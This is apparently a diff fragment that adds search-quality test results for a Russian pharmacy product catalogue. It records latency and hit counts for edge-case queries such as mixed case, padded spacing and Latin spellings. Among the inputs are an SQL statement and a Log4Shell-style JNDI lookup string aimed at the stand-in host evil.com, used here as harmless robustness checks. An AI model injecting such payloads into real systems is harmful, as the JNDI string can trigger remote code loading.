+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "SELECT * FROM drugs;",
+      "latency_ms": "15.23",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "${jndi:ldap://evil.com/a}",
+      "latency_ms": "13.63",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "парацетамол ааааааааааааааа...",
+      "latency_ms": "10.83",
+      "found_count": 47,
+      "top_hit": "Парацетамол, сироп, 2,4% 90 мл, №1"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "ааааааааааааааааааааааааааа...",
+      "latency_ms": "10.55",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "[(.*+?^=!:${}()|[\\]/\\\\",
+      "latency_ms": "0.01",
+      "found_count": 0,
+      "top_hit": "<none>"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "   но   шпа   ",
+      "latency_ms": "3.82",
+      "found_count": 5,
+      "top_hit": "Но-шпа®, таблетки, 40 мг, №24"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "ПАРАЦЕТАМОЛ",
+      "latency_ms": "4.04",
+      "found_count": 60,
+      "top_hit": "Парацетамол, суппозитории ректальные 250мг №10"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "пАрАцЕтАмОл",
+      "latency_ms": "3.98",
+      "found_count": 60,
+      "top_hit": "Парацетамол, суппозитории ректальные 250мг №10"
+    },
+    {
+      "category": "Edge Cases & Invalid (25)",
+      "query": "paracetamol 500mg №10 таб",
+      "latency_ms": "15.99",
+      "found_count": 46,
+      "top_hit": "Парацетамол, сироп, 2,4% 90 мл, №1"
+    }
+  ]
+}
